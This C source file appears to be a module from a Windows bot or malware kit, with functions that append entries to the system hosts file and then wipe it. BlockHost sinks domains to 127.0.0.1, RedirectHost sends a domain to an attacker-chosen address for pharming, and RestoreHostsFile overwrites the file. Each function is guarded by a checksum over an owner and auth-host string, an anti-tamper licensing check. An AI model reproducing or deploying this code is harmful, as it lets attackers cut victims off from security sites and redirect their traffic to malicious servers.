#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_HOSTBLOCK
bool BlockHost(char *cHost)
{
    FILE * pOpenFile;

    char cFile[MAX_PATH];
    strcpy(cFile, cWindowsDirectory);
    strcat(cFile, cHostsPath);

    pOpenFile = fopen(cFile, "a");

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s %s", cAuthHost, cOwner);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 10762/2;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum5)
        return false;
    // <!-------! CRC AREA STOP !-------!>

    char cWriteToFile[DEFAULT];
    sprintf(cWriteToFile, "\n127.0.0.1\t%s", cHost);

    bool bReturn = FALSE;

    if(pOpenFile != NULL)
    {
        fputs(cWriteToFile, pOpenFile);
        fclose(pOpenFile);
        bReturn = TRUE;
    }

    return bReturn;
}

bool RedirectHost(char *cOriginalHost, char *cRedirectToHost)
{
    FILE * pOpenFile;

    char cFile[MAX_PATH];
    strcpy(cFile, cWindowsDirectory);
    strcat(cFile, cHostsPath);

    pOpenFile = fopen(cFile, "a");

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s %s", cAuthHost, cOwner);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 10762/2;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum5)
        return false;
    // <!-------! CRC AREA STOP !-------!>

    char cWriteToFile[DEFAULT];
    sprintf(cWriteToFile, "\n%s\t%s", cRedirectToHost, cOriginalHost);

    bool bReturn = FALSE;

    if(pOpenFile != NULL)
    {
        fputs(cWriteToFile, pOpenFile);
        fclose(pOpenFile);
        bReturn = TRUE;
    }

    return bReturn;
}

bool RestoreHostsFile()
{
    FILE * pOpenFile;

    char cFile[MAX_PATH];
    strcpy(cFile, cWindowsDirectory);
    strcat(cFile, cHostsPath);

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s %s", cAuthHost, cOwner);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 10762/2;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum5)
        return false;
    // <!-------! CRC AREA STOP !-------!>

    pOpenFile = fopen(cFile, "w");

    bool bReturn = FALSE;

    if(pOpenFile != NULL)
    {
        fputs("\n", pOpenFile);
        fclose(pOpenFile);
        bReturn = TRUE;
    }

    return bReturn;
}
#endif
#endif
